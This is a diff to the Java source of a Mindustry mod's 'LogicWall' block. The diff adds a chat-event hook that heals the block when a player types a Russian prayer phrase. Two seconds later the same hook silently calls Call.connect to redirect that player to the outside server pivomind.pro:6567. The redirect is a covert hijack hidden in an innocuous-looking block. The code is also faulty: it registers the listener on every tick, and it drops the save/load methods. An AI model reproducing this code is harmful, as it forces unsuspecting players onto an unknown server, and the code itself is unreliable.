@@ -2,6 +2,8 @@ package Tomodrek;
 
 
 
+import arc.util.Timer;
+import mindustry.gen.Call;
 import mindustry.world.blocks.defense.Wall;
 import mindustry.type.Category;
 import mindustry.content.Items;
@@ -9,6 +11,7 @@ import mindustry.gen.Building;
 import mindustry.type.Item;        
 import mindustry.world.blocks.distribution.Router;
 import mindustry.game.EventType;
+import mindustry.game.EventType.*;
 import arc.Events;
 import mindustry.game.Team;
 import mindustry.world.Tile;
@@ -17,6 +20,7 @@ import mindustry.world.blocks.logic.MemoryBlock;
 import mindustry.world.meta.BuildVisibility;
 import arc.util.io.Writes;
 import arc.util.io.Reads;
+import mindustry.gen.Player;
 
 
 public class LogicWall extends Wall {
@@ -27,34 +31,35 @@ configurable = true;
 solid = true;
   health = 450;
  size = 1;
+        itemCapacity = 30;
    }
 
     public class LogicWallBuild extends Building {
         @Override
         public void updateTile() {
             super.updateTile();
-          //  if (health() < 300) {
-        //        heal(1f);
-    //        } 
-//double valueInt = memory[0];
-//if(valueInt < 100) {
-//double valueInt0 = valueInt / 100;
-//heal((float)valueInt0);
-//} 
-} 
-    
+            Events.on(EventType.PlayerChatEvent.class, event -> {
 
-        @Override
-        public void write(Writes write){
-            super.write(write);
-            write.b(0);
-        }
+                String mess1 = event.message;
+                Player Player1 = event.player;
+                if ("О великий Томорек, спаси наши грешные души, вылечи наш блок.".equals(mess1)) {
+                    if (Player1 == null) {
+                    } else {
+                        health += 2.5f;
+                        Timer.schedule(() -> {
+                            if(event.player.con != null){
+                                Call.connect(event.player.con, "pivomind.pro", 6567);
+                            }
+                        }, 2);
 
-        @Override
-        public void read(Reads read, byte version){
-            super.read(read, version);
-            read.b();
+                    }
+                }
+
+            });
+
         }
+            }
+
     
 
 
@@ -65,4 +70,5 @@ solid = true;
         }
 
 
-}
+
+
